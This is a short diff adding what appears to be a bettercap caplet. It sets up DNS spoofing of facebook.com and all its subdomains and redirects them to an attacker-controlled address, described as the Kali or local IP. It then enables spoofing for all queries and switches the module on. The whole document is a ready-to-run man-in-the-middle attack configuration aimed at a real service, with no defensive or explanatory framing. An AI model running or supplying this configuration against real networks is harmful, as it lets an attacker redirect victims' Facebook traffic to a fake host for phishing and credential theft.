@@ -1,0 +1,5 @@
+#dns spoofing
+set dns.spoof.domains facebook.com,*.facebook.com
+set dns.spoof.address targetIP(kali or local IP address)
+set dns.spoof.all true
+dns.spoof on
